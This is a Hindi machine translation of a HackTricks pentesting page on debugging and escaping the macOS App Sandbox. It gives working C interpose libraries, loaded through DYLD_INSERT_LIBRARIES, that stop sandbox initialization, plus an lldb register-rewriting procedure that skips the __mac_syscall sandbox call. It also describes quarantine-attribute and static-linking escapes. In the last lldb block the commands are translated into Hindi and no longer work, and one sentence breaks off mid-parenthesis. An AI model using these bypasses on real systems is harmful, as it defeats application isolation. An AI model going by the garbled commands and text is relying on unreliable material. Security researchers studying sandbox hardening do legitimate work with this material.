# macOS सैंडबॉक्स डीबग और बाईपास

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल** हों या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** अनुसरण करें।
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके अपना योगदान दें।

</details>

## सैंडबॉक्स लोडिंग प्रक्रिया

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>छवि स्रोत: <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

पिछली छवि में दिखाया गया है कि **सैंडबॉक्स कैसे लोड होगा** जब एक ऐप्लिकेशन जिसमें एंटाइटलमेंट है **`com.apple.security.app-sandbox`**, चलाया जाता है।

कंपाइलर बाइनरी को **`/usr/lib/libSystem.B.dylib`** से लिंक करेगा।

फिर, **`libSystem.B`** अन्य कई फ़ंक्शन को कॉल करेगा जब तक **`xpc_pipe_routine`** ऐप की एंटाइटलमेंट्स को **`securityd`** को भेजता है। सुरक्षादी यह जांचता है कि क्या प्रक्रिया सैंडबॉक्स में क्वारंटीन होनी चाहिए, और यदि हां, तो यह क्वारंटीन हो जाएगी।\
अंत में, सैंडबॉक्स को एक कॉल के माध्यम से सक्रिय किया जाएगा **`__sandbox_ms`** जो **`__mac_syscall`** को कॉल करेगा।

## संभावित बाईपास

### क्वारंटीन एट्रिब्यूट को बाईपास करना

**सैंडबॉक्स प्रक्रियाओं द्वारा बनाए गए फ़ाइलों** को सैंडबॉक्स से बाहर निकलने से रोकने के लिए **क्वारंटीन एट्रिब्यूट** जोड़ा जाता है। हालांकि, यदि आप **क्वारंटीन एट्रिब्यूट के साथ एक `.app` फ़ोल्डर बनाने में सफल हो जाते हैं** जो सैंडबॉक्स वाले ऐप्लिकेशन के बिनरी को **`/bin/bash`** पर पॉइंट करता है और **प्लिस्ट** में कुछ env वेरिएबल्स जोड़ता है, तो **`open`** का दुरुपयोग करके नया ऐप बिनरी को **सैंडबॉक्स से बाहर लॉन्च** करने के लिए इस्तेमाल किया जा सकता है।

यही कार्य किया गया था [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

{% hint style="danger" %}
इसलिए, इस समय, यदि आप केवल एक नाम से समाप्त होने वाले **`.app` फ़ोल्डर** के साथ एक फ़ोल्डर बनाने के क्षमता वाले हैं, तो आप सैंडबॉक्स से बाहर निकल सकते हैं क्योंकि macOS केवल **`.app` फ़ोल्डर** और **मुख्य निष्पादनी** में **क्वारंटीन** एट्रिब्यूट की **जांच** करता है (और हम मुख्य निष्पादनी को **`/bin/bash`** पर पॉइंट करेंगे)।

ध्यान दें कि यदि एक .app बंडल को पहले से ही चलाने की अनुमति है (इसमें अनुमति दी गई है कि यह चलाने के लिए एक क्वारंटीन xttr है), तो आप इसका भी दुरुपयोग कर सकते हैं... केवल अब आप **`.app`** बंडल के अंदर लिख सकते हैं नहीं (जब तक आपके पास कुछ प्रिविलेज्ड TCC पर्मिशन नहीं हैं (
### स्थायी कंपाइलिंग और गतिशील लिंकिंग

[**यह शोध**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ने सैंडबॉक्स को दो तरीकों से उम्मीदवार बनाने के 2 तरीके खोजे हैं। क्योंकि सैंडबॉक्स उपयोगकर्ता भूमि से लागू होता है जब **libSystem** पुस्तकालय लोड होती है। यदि एक बाइनरी इसे लोड करने से बच सकती है, तो यह कभी सैंडबॉक्स नहीं होगा:

* यदि बाइनरी **पूरी तरह से स्थायी रूप से कंपाइल** की गई होती, तो यह पुस्तकालय लोड करने से बच सकती है।
* यदि बाइनरी कोई पुस्तकालय लोड करने की आवश्यकता नहीं होती (क्योंकि लिंकर भी libSystem में होता है), तो यह libSystem लोड करने की आवश्यकता नहीं होगी।&#x20;

### शैलकोड

ध्यान दें कि **यहां तक कि शैलकोड** भी ARM64 में `libSystem.dylib` में लिंक किए जाने की आवश्यकता होती है:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### अधिकार

ध्यान दें कि यदि कोई क्रिया सैंडबॉक्स द्वारा अनुमति दी जा सकती है, तो यदि किसी एप्लिकेशन में एक विशिष्ट अधिकार होता है, तो वह क्रिया संबंधी अधिकार के अनुरूप अनुमति दी जा सकती है, जैसे:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### इंटरपोस्टिंग बाईपास

इंटरपोस्टिंग के बारे में अधिक जानकारी के लिए देखें:

{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
{% endcontent-ref %}

#### सैंडबॉक्स को रोकने के लिए `_libsecinit_initializer` को इंटरपोस्ट करें
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### सैंडबॉक को रोकने के लिए `__mac_syscall` को इंटरपोस्ट करें

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### डीबग और lldb के साथ सैंडबॉक्स को बाईपास करें

चलो एक ऐप्लिकेशन को कंपाइल करें जो सैंडबॉक्स के तहत होना चाहिए:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% tab title="entitlements.xml" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% tab title="Info.plist" %}

इनफो.प्लिस्ट

{% endtab %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

फिर ऐप को कंपाइल करें:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
ऐप फ़ाइल **`~/Desktop/del.txt`** को **पढ़ने** की कोशिश करेगा, जिसे **Sandbox अनुमति नहीं देगा**।\
इसे बाइपास करने के बाद, यह इसे पढ़ सकेगा:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

चलो ऐप्लिकेशन को डीबग करें और देखें कि सैंडबॉक्स कब लोड होता है:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp
# b.lo पते को बदलकर कुछ रजिस्टर्स को संशोधित करके जाने के लिए बाईपास करें
(lldb) ब्रेकपॉइंट डिलीट 1 # बीपी हटाएं
(lldb) रजिस्टर राइट $pc 0x187659928 # b.lo पता
(lldb) रजिस्टर राइट $x0 0x00
(lldb) रजिस्टर राइट $x1 0x00
(lldb) रजिस्टर राइट $x16 0x17d
(lldb) c
प्रक्रिया 2517 पुनरारंभ हो रही है
सैंडबॉक्स बाईपास किया गया!
प्रक्रिया 2517 का स्थानांतरण हुआ, स्थिति = 0 (0x00000000) के साथ बाहर आई
{% hint style="warning" %}
**सैंडबॉक्स बाईपास किए जाने के बावजूद TCC** प्रयोक्ता से पूछेगा कि क्या वह प्रक्रिया को डेस्कटॉप से फ़ाइलें पढ़ने की अनुमति देना चाहता है
{% endhint %}

## संदर्भ

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहेंगे? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की अनुमति** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**.

</details>
